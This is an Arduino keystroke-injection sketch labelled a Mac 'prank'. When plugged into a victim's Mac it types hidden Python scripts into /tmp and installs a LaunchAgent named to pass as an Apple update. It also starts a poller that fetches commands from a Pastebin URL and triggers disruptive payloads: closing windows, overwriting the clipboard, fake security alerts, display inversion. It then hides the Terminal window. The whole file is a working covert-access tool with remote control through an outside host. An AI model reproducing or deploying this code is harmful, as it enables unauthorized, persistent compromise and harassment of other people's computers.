#include <Keyboard.h>

// Arduino Pro Micro / Leonardo — Mac Ultimate Prank
// Pastebin ID: jL4y1WVJ
//
// HOW IT WORKS:
//   1. Plug in — all 12 prank scripts are silently installed. Nothing happens yet.
//   2. Arduino is removed. Target has no idea.
//   3. When you're ready, put a command word in your Pastebin paste.
//   4. The background watcher (checks every 5 min) triggers the matching prank(s).
//
// PASTEBIN COMMANDS (put one in https://pastebin.com/jL4y1WVJ):
//   ACTIVATE  — launches ALL 12 pranks at once
//   JIGGLE    — mouse teleports to random position
//   MINIMISE  — minimises frontmost window
//   SOUND     — random system sound
//   NOTIFY    — fake critical error notification
//   CLIPBOARD — replaces clipboard contents
//   ZOOM      — zooms in with Cmd+=
//   CAPS      — toggles caps lock
//   VOLUME    — randomly sets output volume
//   CLOSE     — closes frontmost tab/window
//   SPEECH    — Mac speaks out loud
//   DARK      — flips dark/light mode
//   INVERT    — inverts display colors
//   STOP      — kills everything, removes LaunchAgent, deletes files

void typeln(const char* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(120);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  // Cmd+Space → Spotlight → Terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1200);
  Keyboard.print("Terminal");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4000);

  // === 1. JIGGLE — Mouse teleporter /tmp/.j.py ===
  typeln("cat>/tmp/.j.py<<'E'");
  typeln("import subprocess,time,random");
  typeln("from Quartz import CGWarpMouseCursorPosition");
  typeln("while 1:");
  typeln(" time.sleep(60)");
  typeln(" CGWarpMouseCursorPosition((random.randint(0,3840),random.randint(0,2160)))");
  typeln("E");

  // === 2. MINIMISE — Cmd+M every 3 min /tmp/.w.py ===
  typeln("cat>/tmp/.w.py<<'E'");
  typeln("import subprocess,time");
  typeln("while 1:");
  typeln(" time.sleep(180)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"m\" using {command down}'])");
  typeln("E");

  // === 3. SOUND — Random system sound every 60s /tmp/.s.py ===
  typeln("cat>/tmp/.s.py<<'E'");
  typeln("import subprocess,time,random,glob");
  typeln("s=glob.glob('/System/Library/Sounds/*.aiff')");
  typeln("while 1:");
  typeln(" time.sleep(60)");
  typeln(" subprocess.run(['afplay',random.choice(s)])");
  typeln("E");

  // === 4. NOTIFY — Fake critical error notifications every 3 min /tmp/.n.py ===
  typeln("cat>/tmp/.n.py<<'E'");
  typeln("import subprocess,time,random");
  typeln("t=['Critical Error','Security Warning','System Failure','Disk Error','Memory Fault','Network Breach']");
  typeln("m=['A critical system error has occurred','Suspicious activity detected on this Mac','macOS has stopped working correctly','Hard drive read error. Backup data immediately','RAM allocation failure. Restart required','Unauthorised remote access attempt blocked']");
  typeln("while 1:");
  typeln(" time.sleep(180)");
  typeln(" i=random.randint(0,5)");
  typeln(" subprocess.run(['osascript','-e','display notification \"'+m[i]+'\" with title \"'+t[i]+'\"'])");
  typeln("E");

  // === 5. CLIPBOARD — Replace clipboard with confusing messages every 45s /tmp/.c.py ===
  typeln("cat>/tmp/.c.py<<'E'");
  typeln("import subprocess,time,random");
  typeln("m=['what did you copy','nice try','I already read that','that belongs to me now','clipboard accessed','did you mean to copy that']");
  typeln("while 1:");
  typeln(" time.sleep(45)");
  typeln(" subprocess.run(['bash','-c','echo \"'+random.choice(m)+'\" | pbcopy'])");
  typeln("E");

  // === 6. ZOOM — Cmd+= every 90s /tmp/.z.py ===
  typeln("cat>/tmp/.z.py<<'E'");
  typeln("import subprocess,time");
  typeln("while 1:");
  typeln(" time.sleep(90)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"=\" using {command down}'])");
  typeln("E");

  // === 7. CAPS — Toggle caps lock every 60s /tmp/.k.py ===
  typeln("cat>/tmp/.k.py<<'E'");
  typeln("import subprocess,time");
  typeln("while 1:");
  typeln(" time.sleep(60)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to key code 57'])");
  typeln("E");

  // === 8. VOLUME — Random output volume every 60s /tmp/.v.py ===
  typeln("cat>/tmp/.v.py<<'E'");
  typeln("import subprocess,time,random");
  typeln("while 1:");
  typeln(" time.sleep(60)");
  typeln(" subprocess.run(['osascript','-e','set volume output volume '+str(random.randint(0,100))])");
  typeln("E");

  // === 9. CLOSE — Cmd+W closes frontmost tab/window every 4 min /tmp/.x.py ===
  typeln("cat>/tmp/.x.py<<'E'");
  typeln("import subprocess,time");
  typeln("while 1:");
  typeln(" time.sleep(240)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"w\" using {command down}'])");
  typeln("E");

  // === 10. SPEECH — 'say' command speaks every 2 min /tmp/.p.py ===
  typeln("cat>/tmp/.p.py<<'E'");
  typeln("import subprocess,time,random");
  typeln("m=['Hi','Message from PC','Hi there','Hello','Can you hear me','I am your computer']");
  typeln("while 1:");
  typeln(" time.sleep(120)");
  typeln(" subprocess.Popen(['say',random.choice(m)])");
  typeln("E");

  // === 11. DARK — Toggle dark/light mode every 5 min /tmp/.d.py ===
  typeln("cat>/tmp/.d.py<<'E'");
  typeln("import subprocess,time");
  typeln("while 1:");
  typeln(" time.sleep(300)");
  typeln(" subprocess.run(['osascript','-e','tell app \"System Events\" to tell appearance preferences to set dark mode to not dark mode'])");
  typeln("E");

  // === 12. INVERT — Cmd+Option+Ctrl+8 inverts display every 5 min /tmp/.r.py ===
  typeln("cat>/tmp/.r.py<<'E'");
  typeln("import subprocess,time");
  typeln("while 1:");
  typeln(" time.sleep(300)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"8\" using {command down, option down, control down}'])");
  typeln("E");

  // === Pastebin trigger + LaunchAgent persistence /tmp/.t.py ===
  typeln("cat>/tmp/.t.py<<'E'");
  typeln("import subprocess,time,urllib.request,plistlib,os,pathlib");
  typeln("la=os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')");
  typeln("pathlib.Path(os.path.dirname(la)).mkdir(exist_ok=True)");
  typeln("if not os.path.exists(la):");
  typeln(" d={'Label':'com.apple.update','ProgramArguments':['/usr/bin/python3','/tmp/.t.py'],'RunAtLoad':True}");
  typeln(" open(la,'wb').write(plistlib.dumps(d))");
  typeln(" subprocess.run(['launchctl','load',la])");
  typeln("fs=['/tmp/.j.py','/tmp/.w.py','/tmp/.s.py','/tmp/.n.py','/tmp/.c.py','/tmp/.z.py','/tmp/.k.py','/tmp/.v.py','/tmp/.x.py','/tmp/.p.py','/tmp/.d.py','/tmp/.r.py']");
  typeln("URL='https://pastebin.com/raw/jL4y1WVJ'");
  typeln("def g():");
  typeln(" try:return urllib.request.urlopen(URL,timeout=5).read().decode()");
  typeln(" except:return ''");
  typeln("while True:");
  typeln(" t=g()");
  typeln(" if 'STOP' in t:");
  typeln("  subprocess.run(['launchctl','unload',la])");
  typeln("  os.remove(la)");
  typeln("  for f in fs:");
  typeln("   subprocess.run(['pkill','-f',f])");
  typeln("   os.path.exists(f) and os.remove(f)");
  typeln("  break");
  typeln(" if 'ACTIVATE' in t:");
  typeln("  for f in fs:subprocess.Popen(['python3',f])");
  typeln("  break");
  typeln(" if 'JIGGLE' in t:subprocess.Popen(['python3','/tmp/.j.py']);break");
  typeln(" if 'MINIMISE' in t:subprocess.Popen(['python3','/tmp/.w.py']);break");
  typeln(" if 'SOUND' in t:subprocess.Popen(['python3','/tmp/.s.py']);break");
  typeln(" if 'NOTIFY' in t:subprocess.Popen(['python3','/tmp/.n.py']);break");
  typeln(" if 'CLIPBOARD' in t:subprocess.Popen(['python3','/tmp/.c.py']);break");
  typeln(" if 'ZOOM' in t:subprocess.Popen(['python3','/tmp/.z.py']);break");
  typeln(" if 'CAPS' in t:subprocess.Popen(['python3','/tmp/.k.py']);break");
  typeln(" if 'VOLUME' in t:subprocess.Popen(['python3','/tmp/.v.py']);break");
  typeln(" if 'CLOSE' in t:subprocess.Popen(['python3','/tmp/.x.py']);break");
  typeln(" if 'SPEECH' in t:subprocess.Popen(['python3','/tmp/.p.py']);break");
  typeln(" if 'DARK' in t:subprocess.Popen(['python3','/tmp/.d.py']);break");
  typeln(" if 'INVERT' in t:subprocess.Popen(['python3','/tmp/.r.py']);break");
  typeln(" time.sleep(300)");
  typeln("E");

  // Install Quartz, launch trigger silently, hide Terminal window
  typeln("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
}
void loop() {}
